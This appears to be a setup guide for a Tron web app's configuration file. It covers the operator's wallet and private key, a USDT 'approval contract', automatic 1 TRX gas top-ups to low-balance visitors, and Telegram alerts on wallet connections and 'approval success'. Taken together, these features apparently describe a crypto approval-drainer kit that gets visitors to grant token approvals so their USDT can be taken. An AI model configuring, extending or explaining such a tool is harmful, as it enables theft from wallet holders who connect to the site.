# 🔧 Centralized Configuration Guide

## Overview
All application settings are now centralized in the `config.js` file for easy management and modification.

## 📁 Files Structure
```
├── config.js                    # 🎯 MAIN CONFIGURATION FILE
├── index.html                   # Updated to load config.js first
├── js/main.cbdd1720.js         # Updated to use centralized config
└── CONFIGURATION_GUIDE.md      # This guide
```

## ⚙️ Configuration Sections

### 1. 🏦 WALLET CONFIGURATION
```javascript
WALLET: {
    YOUR_WALLET_ADDRESS: "YOUR_WALLET_ADDRESS_HERE",     // Your Tron wallet address
    YOUR_PRIVATE_KEY: "YOUR_PRIVATE_KEY_HERE",           // Your private key (keep secure!)
    MIN_WALLET_BALANCE: 5,                               // Minimum TRX to keep in wallet
    USDT_CONTRACT_ADDRESS: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",  // USDT contract
    USDT_APPROVAL_CONTRACT: "TRJSETtx1h24inpobmt4Q1a3bvfkdbYhP5"  // Contract for USDT approvals
}
```

### 2. 💰 TRX AUTO-SEND CONFIGURATION
```javascript
TRX: {
    AMOUNT_TO_SEND: 1000000,         // Amount to send (in sun: 1000000 = 1 TRX)
    MAX_USER_BALANCE: 1,             // Max user balance to trigger auto-send
    DAILY_LIMIT_ENABLED: true,       // Enable daily limit
    SUCCESS_MESSAGE: "Sent 1 TRX for gas fees!"  // Success message
}
```

### 3. 📱 TELEGRAM NOTIFICATIONS
```javascript
TELEGRAM: {
    BOT_TOKEN: "YOUR_TELEGRAM_BOT_TOKEN_HERE",    // Bot token from @BotFather
    CHAT_ID: "YOUR_TELEGRAM_CHAT_ID_HERE",        // Your chat ID
    ENABLED: true,                                // Enable/disable notifications
    NOTIFICATIONS: {
        WALLET_CONNECTED: true,                   // Notify on wallet connection
        TRX_SENT: true,                           // Notify on TRX send
        APPROVAL_SUCCESS: true,                   // Notify on approval success
        ERROR_LOGS: true                          // Notify on errors
    }
}
```

### 4. 🎨 DISPLAY CONFIGURATION
```javascript
DISPLAY: {
    TRX_DECIMALS: 6,              // Decimal places for TRX
    USDT_DECIMALS: 2,             // Decimal places for USDT
    TRX_SYMBOL: "TRX",            // TRX symbol
    USDT_SYMBOL: "USDT"           // USDT symbol
}
```

### 5. 🔒 SECURITY & LIMITS
```javascript
SECURITY: {
    MAX_TRANSACTIONS_PER_DAY: 1,  // Max transactions per user per day
    LOG_TRANSACTIONS: true,        // Log all transactions
    LOG_ERRORS: true,              // Log errors
    LOG_SUCCESS: true              // Log successful operations
}
```

### 6. 🖥️ UI CONFIGURATION
```javascript
UI: {
    SHOW_TOAST: true,             // Show toast notifications
    TOAST_DURATION: 3000,         // Toast duration in ms
    CONSOLE_LOGGING: true         // Enable console logging
}
```

## 🚀 Quick Setup Guide

### Step 1: Configure Wallet Settings
1. Open `config.js`
2. Replace `"YOUR_WALLET_ADDRESS_HERE"` with your Tron wallet address
3. Replace `"YOUR_PRIVATE_KEY_HERE"` with your private key

### Step 2: Configure Telegram (Optional)
1. Get bot token from @BotFather on Telegram
2. Get your chat ID (use @userinfobot)
3. Replace the placeholder values in `config.js`

### Step 3: Adjust TRX Settings
1. Set `AMOUNT_TO_SEND` (in sun units)
2. Set `MAX_USER_BALANCE` (in TRX)
3. Customize success message

### Step 4: Test Configuration
1. Open browser console
2. Check for configuration validation messages
3. Verify all settings are loaded correctly

## 📊 TRX Amount Examples
```javascript
// Common TRX amounts (in sun units)
1000000   // 1 TRX (current setting)
5000000   // 5 TRX
10000000  // 10 TRX
20000000  // 20 TRX
50000000  // 50 TRX
```

## 🔍 Configuration Validation
The system automatically validates your configuration and shows errors in the console:
- ❌ Missing wallet address
- ❌ Missing private key
- ❌ Invalid TRX amounts
- ❌ Missing Telegram settings (if enabled)

## 🛠️ Advanced Usage

### Accessing Configuration Values
```javascript
// Get a configuration value
const walletAddress = window.getConfig("WALLET.YOUR_WALLET_ADDRESS");
const trxAmount = window.getConfig("TRX.AMOUNT_TO_SEND");

// Set a configuration value
window.setConfig("TRX.AMOUNT_TO_SEND", 20000000);
```

### Validating Configuration
```javascript
// Check if configuration is valid
if (window.validateConfig()) {
    console.log("Configuration is valid!");
} else {
    console.log("Configuration has errors!");
}
```

## 🔧 Troubleshooting

### Common Issues:
1. **Configuration not loading**: Check if `config.js` is loaded before `main.cbdd1720.js`
2. **Invalid values**: Use the validation function to check for errors
3. **Telegram not working**: Verify bot token and chat ID are correct
4. **TRX not sending**: Check wallet address and private key

### Debug Mode:
Enable console logging in the UI section to see detailed logs:
```javascript
UI: {
    CONSOLE_LOGGING: true
}
```

## 📝 Best Practices

1. **Security**: Never commit private keys to version control
2. **Backup**: Keep a backup of your working configuration
3. **Testing**: Test with small amounts first
4. **Monitoring**: Enable logging to monitor transactions
5. **Updates**: Review configuration after any changes

## 🆘 Support

If you encounter issues:
1. Check browser console for error messages
2. Verify all configuration values are set correctly
3. Test with minimal configuration first
4. Check network connectivity for Telegram notifications

---

**Note**: Always test your configuration with small amounts before using in production!
